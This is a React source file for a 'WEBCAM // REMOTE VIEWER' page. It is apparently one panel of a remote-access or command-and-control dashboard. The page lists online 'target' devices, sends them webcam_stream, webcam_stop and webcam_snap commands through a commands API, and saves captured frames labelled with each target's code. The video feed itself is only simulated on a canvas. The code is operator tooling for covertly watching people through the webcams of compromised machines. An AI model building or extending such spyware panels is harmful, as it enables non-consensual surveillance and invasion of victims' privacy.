import { useState, useRef, useEffect } from "react";
import { Sidebar } from "@/components/layout/sidebar";
import { GlitchText } from "@/components/ui/glitch-text";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { 
  Select, 
  SelectContent, 
  SelectItem, 
  SelectTrigger, 
  SelectValue 
} from "@/components/ui/select";
import { 
  Camera, 
  Play, 
  Square, 
  Download, 
  Monitor,
  Video,
  ImageIcon,
  RefreshCw
} from "lucide-react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { motion } from "framer-motion";
import { cn } from "@/lib/utils";
import type { Target } from "@shared/schema";

export default function WebcamPage() {
  const [selectedTarget, setSelectedTarget] = useState<string>("");
  const [isStreaming, setIsStreaming] = useState(false);
  const [capturedImages, setCapturedImages] = useState<string[]>([]);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const animationRef = useRef<number | null>(null);

  const { data: targets } = useQuery<Target[]>({
    queryKey: ["/api/targets"],
    queryFn: async () => {
      const res = await fetch("/api/targets");
      if (!res.ok) return [];
      return res.json();
    },
  });

  const isValidTarget = selectedTarget && selectedTarget !== "" && selectedTarget !== "none";

  const startStreamMutation = useMutation({
    mutationFn: async () => {
      if (!isValidTarget) throw new Error("No valid target selected");
      const res = await fetch(`/api/targets/${selectedTarget}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: "webcam_stream" }),
      });
      if (!res.ok) throw new Error("Failed to start stream");
      return res.json();
    },
    onSuccess: () => {
      setIsStreaming(true);
    },
  });

  const stopStreamMutation = useMutation({
    mutationFn: async () => {
      if (!isValidTarget) throw new Error("No valid target selected");
      const res = await fetch(`/api/targets/${selectedTarget}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: "webcam_stop" }),
      });
      if (!res.ok) throw new Error("Failed to stop stream");
      return res.json();
    },
    onSuccess: () => {
      setIsStreaming(false);
    },
  });

  const captureImageMutation = useMutation({
    mutationFn: async () => {
      if (!isValidTarget) throw new Error("No valid target selected");
      const res = await fetch(`/api/targets/${selectedTarget}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: "webcam_snap" }),
      });
      if (!res.ok) throw new Error("Failed to capture image");
      return res.json();
    },
    onSuccess: () => {
      if (canvasRef.current) {
        const imageUrl = canvasRef.current.toDataURL("image/png");
        setCapturedImages(prev => [imageUrl, ...prev.slice(0, 11)]);
      }
    },
  });

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const drawSimulatedFeed = () => {
      if (!isStreaming) {
        ctx.fillStyle = "#0a0a0a";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#00ff41";
        ctx.font = "14px monospace";
        ctx.textAlign = "center";
        ctx.fillText("NO SIGNAL", canvas.width / 2, canvas.height / 2);
        return;
      }

      ctx.fillStyle = `rgba(10, 10, 10, 0.05)`;
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      const time = Date.now() / 1000;
      for (let i = 0; i < 3; i++) {
        ctx.beginPath();
        const x = Math.sin(time + i) * 100 + canvas.width / 2;
        const y = Math.cos(time * 0.7 + i) * 80 + canvas.height / 2;
        ctx.arc(x, y, 30 + i * 20, 0, Math.PI * 2);
        ctx.strokeStyle = `rgba(0, 255, 65, ${0.3 - i * 0.1})`;
        ctx.lineWidth = 2;
        ctx.stroke();
      }

      ctx.fillStyle = "rgba(0, 255, 65, 0.1)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      for (let y = 0; y < canvas.height; y += 4) {
        if (Math.random() > 0.97) {
          ctx.fillStyle = "rgba(0, 255, 65, 0.03)";
          ctx.fillRect(0, y, canvas.width, 2);
        }
      }

      const now = new Date();
      ctx.fillStyle = "#00ff41";
      ctx.font = "12px monospace";
      ctx.textAlign = "left";
      ctx.fillText(`REC ${now.toLocaleTimeString()}`, 10, 20);
      
      ctx.beginPath();
      ctx.arc(canvas.width - 15, 15, 5, 0, Math.PI * 2);
      ctx.fillStyle = Math.floor(time) % 2 === 0 ? "#ff0000" : "#ff000050";
      ctx.fill();

      animationRef.current = requestAnimationFrame(drawSimulatedFeed);
    };

    if (isStreaming) {
      drawSimulatedFeed();
    } else {
      drawSimulatedFeed();
    }

    return () => {
      if (animationRef.current) {
        cancelAnimationFrame(animationRef.current);
        animationRef.current = null;
      }
    };
  }, [isStreaming]);

  const onlineTargets = targets?.filter(t => t.status === "online") || [];
  const selectedTargetData = targets?.find(t => t.id.toString() === selectedTarget);

  const handleDownloadImage = (imageUrl: string, index: number) => {
    const a = document.createElement("a");
    a.href = imageUrl;
    a.download = `webcam_capture_${selectedTargetData?.uniqueCode?.slice(0, 8) || "unknown"}_${index + 1}.png`;
    a.click();
  };

  return (
    <div className="flex h-screen w-full bg-background text-foreground font-mono overflow-hidden">
      <Sidebar />
      
      <main className="flex-1 flex flex-col overflow-hidden relative">
        <header className="h-16 border-b border-primary/20 flex items-center justify-between px-6 bg-black/50 backdrop-blur-sm">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold tracking-tight">
              <GlitchText text="WEBCAM // REMOTE VIEWER" />
            </h1>
          </div>
          <div className="flex items-center gap-2 text-xs text-primary/60">
            <Camera className="w-4 h-4 animate-pulse" />
            <span>VISUAL_FEED</span>
          </div>
        </header>

        <div className="flex-1 overflow-hidden p-6 pb-20">
          <div className="h-full grid grid-cols-1 lg:grid-cols-12 gap-6">
            <div className="lg:col-span-8 flex flex-col gap-4">
              <div className="flex items-center gap-4">
                <Select value={selectedTarget} onValueChange={setSelectedTarget}>
                  <SelectTrigger className="w-80 bg-black/50 border-primary/30" data-testid="select-target">
                    <SelectValue placeholder="Select target device..." />
                  </SelectTrigger>
                  <SelectContent>
                    {onlineTargets.map((target) => (
                      <SelectItem key={target.id} value={target.id.toString()}>
                        <div className="flex items-center gap-2">
                          <Monitor className="w-4 h-4" />
                          <span>{target.hostname || target.ip}</span>
                          <Badge variant="outline" className="text-[10px] ml-2">
                            {target.uniqueCode?.slice(0, 8)}
                          </Badge>
                        </div>
                      </SelectItem>
                    ))}
                    {onlineTargets.length === 0 && (
                      <SelectItem value="none" disabled>No online targets</SelectItem>
                    )}
                  </SelectContent>
                </Select>

                <div className="flex gap-2">
                  <Button
                    onClick={() => startStreamMutation.mutate()}
                    disabled={!isValidTarget || isStreaming}
                    className="bg-green-600 hover:bg-green-700"
                    data-testid="button-start-stream"
                  >
                    <Play className="w-4 h-4 mr-2" />
                    Start Stream
                  </Button>
                  <Button
                    onClick={() => stopStreamMutation.mutate()}
                    disabled={!isValidTarget || !isStreaming}
                    variant="destructive"
                    data-testid="button-stop-stream"
                  >
                    <Square className="w-4 h-4 mr-2" />
                    Stop
                  </Button>
                  <Button
                    onClick={() => captureImageMutation.mutate()}
                    disabled={!isValidTarget || !isStreaming}
                    variant="outline"
                    className="border-primary/30"
                    data-testid="button-capture"
                  >
                    <ImageIcon className="w-4 h-4 mr-2" />
                    Capture
                  </Button>
                </div>

                {isStreaming && (
                  <Badge className="bg-red-500 animate-pulse">
                    LIVE
                  </Badge>
                )}
              </div>

              <Card className="flex-1 bg-black/40 border-primary/20 backdrop-blur-md overflow-hidden">
                <div className="p-2 border-b border-primary/10 flex items-center justify-between bg-primary/5">
                  <div className="flex items-center gap-2">
                    <Video className="w-4 h-4 text-primary" />
                    <span className="text-xs font-bold text-primary">Live Feed</span>
                    {selectedTargetData && (
                      <Badge variant="outline" className="text-[10px]">
                        {selectedTargetData.hostname || selectedTargetData.ip}
                      </Badge>
                    )}
                  </div>
                  {isStreaming && (
                    <span className="text-[10px] text-primary/60">640x480 @ 15fps</span>
                  )}
                </div>
                <div className="relative aspect-video bg-black flex items-center justify-center">
                  <canvas 
                    ref={canvasRef} 
                    width={640} 
                    height={480}
                    className="max-w-full max-h-full border border-primary/20"
                  />
                  {!selectedTarget && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/80 text-muted-foreground gap-2">
                      <Camera className="w-16 h-16 opacity-30" />
                      <span>Select a target to view webcam feed</span>
                    </div>
                  )}
                </div>
              </Card>
            </div>

            <div className="lg:col-span-4 flex flex-col gap-4">
              <Card className="flex-1 bg-black/40 border-primary/20 backdrop-blur-md flex flex-col overflow-hidden">
                <div className="p-3 border-b border-primary/10 flex items-center justify-between bg-primary/5">
                  <div className="flex items-center gap-2">
                    <ImageIcon className="w-4 h-4 text-primary" />
                    <span className="text-xs font-bold text-primary">Captured Images</span>
                  </div>
                  <Badge variant="outline" className="text-[10px]">
                    {capturedImages.length} / 12
                  </Badge>
                </div>
                <div className="flex-1 overflow-y-auto p-3">
                  {capturedImages.length > 0 ? (
                    <div className="grid grid-cols-2 gap-2">
                      {capturedImages.map((img, index) => (
                        <motion.div
                          key={index}
                          initial={{ opacity: 0, scale: 0.9 }}
                          animate={{ opacity: 1, scale: 1 }}
                          className="relative group cursor-pointer border border-primary/20 rounded overflow-hidden"
                          onClick={() => handleDownloadImage(img, index)}
                        >
                          <img src={img} alt={`Capture ${index + 1}`} className="w-full h-auto" />
                          <div className="absolute inset-0 bg-black/70 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                            <Download className="w-6 h-6 text-primary" />
                          </div>
                        </motion.div>
                      ))}
                    </div>
                  ) : (
                    <div className="h-full flex flex-col items-center justify-center text-muted-foreground opacity-50 gap-2">
                      <ImageIcon className="w-8 h-8" />
                      <span className="text-xs text-center">No captures yet</span>
                    </div>
                  )}
                </div>
              </Card>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
